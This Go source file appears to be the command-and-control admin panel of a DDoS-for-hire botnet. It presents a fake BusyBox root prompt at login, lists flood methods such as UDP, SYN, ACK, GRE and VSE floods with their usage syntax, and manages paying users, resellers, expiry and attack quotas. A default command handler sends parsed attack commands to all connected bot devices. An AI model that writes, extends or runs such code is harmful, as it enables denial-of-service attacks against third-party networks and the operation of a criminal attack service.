package main

import (
	"fmt"
	"math/rand"
	"net"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
)

type CaptchaToken struct {
	Token     string
	ValidTime time.Time
}

var captchaTokens = make(map[string]CaptchaToken)

func generateRandomCaptcha() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	tokenLength := 6 // You can adjust the length of the captcha token as needed
	rand.Seed(time.Now().UnixNano())

	token := make([]byte, tokenLength)
	for i := 0; i < tokenLength; i++ {
		token[i] = charset[rand.Intn(len(charset))]
	}

	return string(token)
}

// GenerateCaptcha generates a captcha token and returns it
func GenerateCaptcha() string {
	token := generateRandomCaptcha()             // Implement your captcha generation logic here
	validTime := time.Now().Add(5 * time.Minute) // Set an expiration time for the captcha token

	captchaTokens[token] = CaptchaToken{
		Token:     token,
		ValidTime: validTime,
	}

	return token
}

// admin function
func Admin(conn net.Conn) {
	defer conn.Close()
	if _, err := conn.Write([]byte("\x1bc\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22\033]0;Welcome back!\007")); err != nil {
		return
	}

	conn.Read(make([]byte, 32))

	// username
	username, err := Read(conn, "\x1b[37mroot@server:~# ", "", 20)
	if err != nil {
		return
	}

	account, err := FindUser(username)
	if err != nil || account == nil {
		conn.Write([]byte("\x1b[37mWrong command!"))
		time.Sleep(50 * time.Millisecond)
		return
	}

	// password
	password, err := Read(conn, "\x1b[37mroot@server:~# ", "*", 20)
	if err != nil {
		return
	} else if password != account.Password {
		conn.Write([]byte("\x1b[37mWrong command!"))
		time.Sleep(50 * time.Millisecond)
		return
	}
	if strings.TrimSpace(username) != "root" {
		// Generate and display a captcha
		captcha := GenerateCaptcha()
		conn.Write([]byte(fmt.Sprintf("\x1b[37mEnter Captcha %s: ", captcha)))

		// Read the user's captcha input
		captchaInput, err := Read(conn, "", "", 20)
		if err != nil || captchaInput != captcha {
			conn.Write([]byte("\x1b[37mCaptcha failed!"))
			time.Sleep(50 * time.Millisecond)
			return
		}
	}

	// User is a new user so therefore they will need to modify their password.
	if account.NewUser {
		conn.Write([]byte("\x1b[37mChange to new password\r\n"))
		newpassword, err := Read(conn, "\x1b[37mroot@server:~# ", "*", 20)
		if err != nil {
			return
		}

		if err := ModifyField(account, "password", newpassword); err != nil {
			conn.Write([]byte("\x1b[37mCant change password!"))
			time.Sleep(50 * time.Millisecond)
			return
		}

		ModifyField(account, "newuser", false)
	}

	if account.Expiry <= time.Now().Unix() {
		conn.Write([]byte("\x1b[37mYour plan has expired! contact your seller to renew!\x1b[0m"))
		time.Sleep(10 * time.Second)
		return
	}

	session := NewSession(conn, account)
	defer delete(Sessions, session.Opened.Unix())

	conn.Write([]byte("\033[2J\033[1H"))
	conn.Write([]byte("\r\n\x1b[37mBusyBox v1.30.1 (Ubuntu 1:1.30.1-4ubuntu6) multi-call binary.\r\n"))
	conn.Write([]byte("\x1b[37mBusyBox is copyrighted by many authors between 1998-2015.\r\n\r\n"))
	for {
		command, err := ReadWithHistory(conn, fmt.Sprintf("\x1b[37m%s@server:~# ", session.User.Username), "", 60, session.History)
		if err != nil {
			return
		}

		session.History = append(session.History, command)

		// Main command handling
		switch strings.Split(strings.ToLower(command), " ")[0] {

		// Clear command
		case "clear", "cls", "c":
			session.History = make([]string, 0)
			conn.Write([]byte("\033[2J\033[1H"))
			conn.Write([]byte("\r\n\x1b[37mBusyBox v1.30.1 (Ubuntu 1:1.30.1-4ubuntu6) multi-call binary.\r\n"))
			conn.Write([]byte("\x1b[37mBusyBox is copyrighted by many authors between 1998-2015.\r\n\r\n"))
			continue

		// Methods command
		case "methods", "method", "syntax":
			item := MethodsFromMapToArray(make([]string, 0))
			sort.Slice(item, func(i, j int) bool {
				return len(item[i]) < len(item[j])
			})

			// Ranges through all the methods
			session.Conn.Write([]byte("\x1b[37mthreads: udp flood with threads.\r\n"))
			session.Conn.Write([]byte("\x1b[37msynflood: tcp flood with syn flag.\r\n"))
			session.Conn.Write([]byte("\x1b[37mackflood: tcp flood with ack flag.\r\n"))
			session.Conn.Write([]byte("\x1b[37mppsflood: udp flood for high packets per seconds.\r\n"))
			session.Conn.Write([]byte("\x1b[37msackflood: customer ack flood.\r\n"))
			session.Conn.Write([]byte("\x1b[37mtcpsocket: tcp flood for high connections per seconds\r\n"))
			session.Conn.Write([]byte("\x1b[37mtcpstream: tcp custom flood for bypassing.\r\n"))
			session.Conn.Write([]byte("\x1b[37mstdhex: udp flood with random hex.\r\n"))
			session.Conn.Write([]byte("\x1b[37mvseflood: value source engine flood.\r\n"))
			session.Conn.Write([]byte("\x1b[37mgreip: gre ip flood.\r\n"))
			session.Conn.Write([]byte("\x1b[37mtcpwra: tcp custom flood for games.\r\n\r\n"))
			session.Conn.Write([]byte("\x1b[37msyntax: .udpthread 1.1.1.1 60 dport=80\r\n"))
		case "?", "help", "h":
			access := 2
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mmethods - view all methods available\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mclear - clears your terminal and history\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mcreate - create a new user\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mremove - removes a existing user\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37madmin - modify a users admin status\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mapi - modify a users api status\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mbots - view the different types of bots connected\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mattacks <enable/disable>  - enables or disables attacks\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mmaxtime - modify a users maxtime\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37mcooldown - modify a users cooldown\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[37musers - see the users in the database\x1b[0m\r\n"))

		case "attacks": // Enable/Disable attacks possible.
			args := strings.Split(strings.ToLower(command), " ")[1:]
			if !session.User.Admin || len(args) == 0 {
				session.Conn.Write([]byte("\x1b[37mOnly admin can use this command.\r\n"))
				continue
			}

			switch strings.ToLower(args[0]) {

			case "enable", "active", "attacks": // Enable attacks
				Attacks = true
				session.Conn.Write([]byte("\x1b[37mAttacks are now enabled!\x1b[0m\r\n"))
			case "disable", "!attacks": // Disable attacks
				Attacks = false
				session.Conn.Write([]byte("\x1b[37mAttacks are now disabled!\x1b[0m\r\n"))

			case "global": // Change max cap
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte("\x1b[37mInclude a new int for max.\x1b[0m\r\n"))
					continue
				}

				new, err := strconv.Atoi(args[1])
				if err != nil {
					session.Conn.Write([]byte("\x1b[37mInclude a new int for max.\x1b[0m\r\n"))
					continue
				}

				Options.Templates.Attacks.MaximumOngoing = new
				session.Conn.Write([]byte("\x1b[37mAttacks max running global cap changed!\x1b[0m\r\n"))

			case "reset_user": // Reset a users attack logs
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte("\x1b[37mInclude a username\x1b[0m\r\n"))
					continue
				}

				if usr, _ := FindUser(args[1]); usr == nil {
					session.Conn.Write([]byte("\x1b[37mInclude a valid username\x1b[0m\r\n"))
					continue
				}

				if err := CleanAttacksForUser(args[1]); err != nil {
					session.Conn.Write([]byte("\x1b[37mFailed to clean attack logs!\x1b[0m\r\n"))
					continue
				}

				session.Conn.Write([]byte("\x1b[37mAttack logs reset for that user\x1b[0m\r\n"))
			}

			continue

		case "bots":
			// Non-admins can not see the different types of client sources connected
			if !session.User.Admin {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mTotal: %d\x1b[0m\r\n", len(Clients))))
				continue
			}

			// Loops through all the access clients
			for source, amount := range SortClients(make(map[string]int)) {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[37m%s:  %d\x1b[0m\r\n", source, amount)))
			}

			continue
		case "api": // API examples/help
			if !session.User.API && !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou don't have API access!\x1b[0m\r\n"))
				continue
			} else if session.User.Admin || session.User.Reseller && session.User.API {
				args := strings.Split(command, " ")[1:]
				if len(args) <= 1 {
					session.Conn.Write([]byte("\x1b[37mYou must provide a username & bool\x1b[0m\r\n"))
					continue
				}

				status, err := strconv.ParseBool(args[0])
				if err != nil {
					session.Conn.Write([]byte("\x1b[37mYou must provide a username & bool\x1b[0m\r\n"))
					continue
				}

				user, err := FindUser(args[1])
				if err != nil || user == nil {
					session.Conn.Write([]byte("\x1b[37mUser doesnt exist\x1b[0m\r\n"))
					continue
				}

				if user.API == status {
					session.Conn.Write([]byte("\x1b[37mStatus is already what you are trying to change too\x1b[0m\r\n"))
					continue
				}

				if err := ModifyField(user, "api", status); err != nil {
					session.Conn.Write([]byte("\x1b[37mFailed to modify users api status\x1b[0m\r\n"))
					continue
				}

				session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mSuccessfully changed users api status to %v!\x1b[0m\r\n", status)))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mHey %s, it seems you have API access!\x1b[0m\r\n", session.User.Username)))

		case "admin":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[37mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if user.Admin == status {
				session.Conn.Write([]byte("\x1b[37mStatus is already what you are trying to change too\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "admin", status); err != nil {
				session.Conn.Write([]byte("\x1b[37mFailed to modify users admin status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mSuccessfully changed users admin status to %v!\x1b[0m\r\n", status)))
			continue

		case "reseller":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[37mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if user.Reseller == status {
				session.Conn.Write([]byte("\x1b[37mStatus is already what you are trying to change too\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "reseller", status); err != nil {
				session.Conn.Write([]byte("\x1b[37mFailed to modify users reseller status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mSuccessfully changed users reseller status to %v!\x1b[0m\r\n", status)))
			continue

		case "maxtime":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			maxtime, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[37mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "maxtime", maxtime); err != nil {
				session.Conn.Write([]byte("\x1b[37mFailed to modify users maxtime status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mSuccessfully changed users maxtime status to %d!\x1b[0m\r\n", maxtime)))
			continue

		case "cooldown":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			cooldown, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[37mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "cooldown", cooldown); err != nil {
				session.Conn.Write([]byte("\x1b[37mFailed to modify users maxtime status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mSuccessfully changed users cooldown status to %d!\x1b[0m\r\n", cooldown)))
			continue

		case "conns":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			conns, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[37mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "conns", conns); err != nil {
				session.Conn.Write([]byte("\x1b[37mFailed to modify users conns status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mSuccessfully changed users conns status to %d!\x1b[0m\r\n", conns)))
			continue

		case "max_daily":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[37mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "max_daily", days); err != nil {
				session.Conn.Write([]byte("\x1b[37mFailed to modify users max_daily status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mSuccessfully changed users max_daily status to %d!\x1b[0m\r\n", days)))
			continue

		case "days":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[37mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "expiry", time.Now().Add(time.Duration(days)*24*time.Hour).Unix()); err != nil {
				session.Conn.Write([]byte("\x1b[37mFailed to modify users maxtime status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mSuccessfully changed users expiry status to %d!\x1b[0m\r\n", days)))
			continue

		case "create": // Creates a new user
			if !session.User.Admin && !session.User.Reseller {
				session.Conn.Write([]byte("\x1b[37mOnly admins/resellers can currently create users!\x1b[0m\r\n"))
				continue
			}

			args := make(map[string]string)
			order := []string{"username", "password", "days"}
			for pos := 1; pos < len(strings.Split(strings.ToLower(command), " ")); pos++ {
				if pos-1 >= len(order) {
					break
				}

				args[order[pos-1]] = strings.Split(strings.ToLower(command), " ")[pos]
			}

			// Allows allocation not inside the args
			for _, item := range order {
				if _, ok := args[item]; ok {
					continue
				}
				value, err := Read(conn, item+"> ", "", 40)
				if err != nil {
					return
				}
				args[item] = value
			}

			if usr, _ := FindUser(args["username"]); usr != nil {
				session.Conn.Write([]byte("\x1b[38;5;11mUser already exists in SQL!\x1b[0m\r\n"))
				continue
			}

			expiry, err := strconv.Atoi(args["days"])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;11mDays active must be a int!\x1b[0m\r\n"))
				continue
			}

			// Inserts the user into the database
			err = CreateUser(&User{Username: args["username"], Password: args["password"], Maxtime: Options.Templates.Database.Defaults.Maxtime, Admin: Options.Templates.Database.Defaults.Admin, API: Options.Templates.Database.Defaults.API, Cooldown: Options.Templates.Database.Defaults.Cooldown, Conns: Options.Templates.Database.Defaults.Concurrents, MaxDaily: Options.Templates.Database.Defaults.MaxDaily, NewUser: true, Expiry: time.Now().Add(time.Duration(expiry) * time.Hour * 24).Unix()})
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mError creating user inside the database!\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte("\x1b[37mUser created successfully\x1b[0m\r\n"))
			continue

		case "remove": // Remove a choosen user from the database
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 0 {
				session.Conn.Write([]byte("\x1b[37mYou must provide a username\x1b[0m\r\n"))
				continue
			}

			if usr, _ := FindUser(args[0]); usr == nil || err != nil {
				session.Conn.Write([]byte("\x1b[37mUnknown username\x1b[0m\r\n"))
				continue
			}

			if err := RemoveUser(args[0]); err != nil {
				session.Conn.Write([]byte("\x1b[37mFailed to remove user\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte("\x1b[37mRemoved the user!\x1b[0m\r\n"))
			continue

		case "broadcast": // Broadcast a message to all the clients connected
			message := strings.Join(strings.Split(command, " ")[1:], " ")
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			for _, s := range Sessions {
				s.Conn.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[48;5;11m\x1b[38;5;16m " + fmt.Sprintf("%s", message) + " \x1b[0m\x1b8"))
			}

		case "users":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			users, err := GetUsers()
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mErr: " + err.Error() + "\x1b[0m\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[37m" + "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Time"},
					{Align: simpletable.AlignCenter, Text: "Conns"},
					{Align: simpletable.AlignCenter, Text: "Cooldown"},
					{Align: simpletable.AlignCenter, Text: "MaxDaily"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Reseller"},
					{Align: simpletable.AlignCenter, Text: "API" + "\x1b[37m"},
				},
			}

			for _, u := range users {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m" + fmt.Sprint(u.ID) + "\x1b[37m"},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(u.Username)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d\x1b[37m", u.Maxtime)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d\x1b[37m", u.Conns)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d\x1b[37m", u.Cooldown)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d\x1b[37m", u.MaxDaily)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.Admin) + "\x1b[37m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.Reseller) + "\x1b[37m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.API)+"\x1b[37m") + "\x1b[0m"},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		case "ongoing": // Global ongoing attacks

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[37m" + "#"},
					{Align: simpletable.AlignCenter, Text: "Target"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Finish\x1b[37m"},
				},
			}

			ongoing, err := OngoingAttacks(time.Now())
			if err != nil {
				session.Conn.Write([]byte("\x1b[37mCant fetch ongoing attacks\x1b[0m\r\n"))
				continue
			}

			for i, attack := range ongoing {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[37m" + fmt.Sprint(i) + ""},
					{Align: simpletable.AlignCenter, Text: attack.Target},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(attack.Duration)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(attack.User)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[37m%.2fsecs", time.Until(time.Unix(attack.Finish, 0)).Seconds()) + ""},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		case "sessions":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[37mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[37m" + "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "IP"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Reseller"},
					{Align: simpletable.AlignCenter, Text: "API" + "\x1b[37m"},
				},
			}

			for i, u := range Sessions {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m" + fmt.Sprint(i) + "\x1b[37m"},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(u.User.Username)},
					{Align: simpletable.AlignCenter, Text: strings.Join(strings.Split(u.Conn.RemoteAddr().String(), ":")[:len(strings.Split(u.Conn.RemoteAddr().String(), ":"))-1], ":")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.User.Admin) + "\x1b[37m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.User.Reseller) + "\x1b[37m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.User.API)+"\x1b[37m") + "\x1b[0m"},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		default:
			attack, ok := IsMethod(strings.Split(strings.ToLower(command), " ")[0])
			if !ok && attack == nil {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;16m`\x1b[37m\x1b[9m%s\x1b[0m\x1b[38;5;16m`\x1b[37m doesn't exist!\x1b[0m\r\n", strings.Split(strings.ToLower(command), " ")[0])))
				continue
			}

			// Builds the attack command into bytes
			payload, err := attack.Parse(strings.Split(command, " "), account)
			if err != nil {
				session.Conn.Write([]byte(fmt.Sprint(err) + "\r\n"))
				continue
			}

			bytes, err := payload.Bytes()
			if err != nil {
				session.Conn.Write([]byte(fmt.Sprint(err) + "\r\n"))
				continue
			}

			BroadcastClients(bytes)
			if len(Clients) <= 1 { // 1 or less clients broadcasted too
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mCommand broadcasted to %d active device!\x1b[0m\r\n", len(Clients))))
			} else { // 2 or more clients broadcasted too
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mCommand broadcasted to %d active devices!\x1b[0m\r\n", len(Clients))))
			}
		}
	}
}

// FormatBool will take the string and convert into a coloured boolean
func FormatBool(b bool) string {
	if b {
		return "\x1b[37mtrue\x1b[0m"
	}

	return "\x1b[37mfalse\x1b[0m"
}
